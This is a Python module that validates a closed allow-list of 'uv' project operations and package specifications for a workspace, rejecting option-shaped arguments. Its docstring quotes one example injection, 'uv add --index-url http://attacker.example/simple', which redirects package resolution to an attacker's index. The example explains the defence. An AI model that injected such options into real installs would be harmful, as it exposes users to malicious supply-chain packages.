"""The closed set of ``uv`` project operations a workspace may run.

A project operation is the only way a user changes the environment, so it is an
allow-list rather than free-form arguments. There are two reasons, and both are
about more than tidiness:

1. **The arguments end up in a command.** Even though the adapter quotes every
   token, a value that begins with ``-`` is an *option* to ``uv``, not a package:
   ``uv add --index-url http://attacker.example/simple`` points the resolver at
   somebody else's package index while ``uv.lock`` still looks legitimate. An
   allow-list that rejects anything option-shaped closes that door at the source
   instead of relying on a caller not to try it.
2. **A closed set is testable.** ``uv sync``/``lock``/``add`` are pinned to exact
   argv here, so the adapter has no logic to get wrong.

Everything else a user wants to do with packages — inspect ``pyproject.toml``,
read ``uv.lock``, run a script — is a file read or a ``SCRIPT`` execution, not a
project operation.
"""

from dataclasses import dataclass, field
import re

from src.domain.workspaces.exceptions import InvalidWorkspaceError

PROJECT_SYNC = "sync"
PROJECT_LOCK = "lock"
PROJECT_ADD = "add"

SUPPORTED_PROJECT_OPERATIONS: frozenset[str] = frozenset(
    {PROJECT_SYNC, PROJECT_LOCK, PROJECT_ADD}
)

#: Operations that take no arguments at all.
_ARGUMENTLESS_OPERATIONS: frozenset[str] = frozenset({PROJECT_SYNC, PROJECT_LOCK})

MAX_PROJECT_ARGS = 20
MAX_ARG_LENGTH = 128

#: A PEP 508-ish package requirement, deliberately narrow: a name, an optional
#: extras group, and an optional one-clause version constraint. It does not try
#: to be a complete PEP 508 parser — it tries to accept what a person types into
#: an "add a dependency" field and reject everything else. Anything more exotic
#: is a direct-URL requirement, which is exactly the supply-chain case this
#: allow-list exists to refuse.
_PACKAGE_SPEC = re.compile(
    r"^[A-Za-z0-9][A-Za-z0-9._+-]*"          # distribution name
    r"(?:\[[A-Za-z0-9._+-]+(?:,[A-Za-z0-9._+-]+)*\])?"  # [extras]
    r"(?:[<>=!~]=?[A-Za-z0-9.*+!_-]+)?"      # one version clause
    r"$"
)


@dataclass(frozen=True)
class ProjectOperation:
    """A validated ``uv`` project operation and the exact argv it becomes."""

    name: str
    args: tuple[str, ...] = field(default=())

    @property
    def uv_argv(self) -> tuple[str, ...]:
        """The argv the runtime executes. Never a shell string."""
        if self.name == PROJECT_SYNC:
            return ("uv", "sync")
        if self.name == PROJECT_LOCK:
            return ("uv", "lock")
        return ("uv", "add", *self.args)


def parse_project_operation(source: str) -> ProjectOperation:
    """Validate ``"<operation> [args]"`` into a :class:`ProjectOperation`.

    Rejecting is strict on purpose: a project operation that is *almost* right
    would otherwise run something the user did not ask for, and it would run it
    against their persistent environment.
    """
    parts = str(source).split()
    if not parts:
        raise InvalidWorkspaceError("A project operation is required.")

    name = parts[0].lower()
    if name not in SUPPORTED_PROJECT_OPERATIONS:
        supported = ", ".join(sorted(SUPPORTED_PROJECT_OPERATIONS))
        raise InvalidWorkspaceError(
            f"Unsupported project operation {parts[0]!r}; supported: {supported}."
        )

    args = tuple(parts[1:])
    if name in _ARGUMENTLESS_OPERATIONS:
        if args:
            raise InvalidWorkspaceError(f"Project operation {name!r} takes no arguments.")
        return ProjectOperation(name=name)

    # `add`
    if not args:
        raise InvalidWorkspaceError("Project operation 'add' requires a package name.")
    if len(args) > MAX_PROJECT_ARGS:
        raise InvalidWorkspaceError(
            f"Project operation 'add' accepts at most {MAX_PROJECT_ARGS} packages."
        )
    for arg in args:
        if len(arg) > MAX_ARG_LENGTH:
            raise InvalidWorkspaceError("A package specification is too long.")
        if arg.startswith("-"):
            # An option, not a package. See the module docstring.
            raise InvalidWorkspaceError(
                f"Package specifications may not start with '-': {arg!r}."
            )
        if not _PACKAGE_SPEC.match(arg):
            raise InvalidWorkspaceError(f"{arg!r} is not a valid package specification.")
    return ProjectOperation(name=name, args=args)
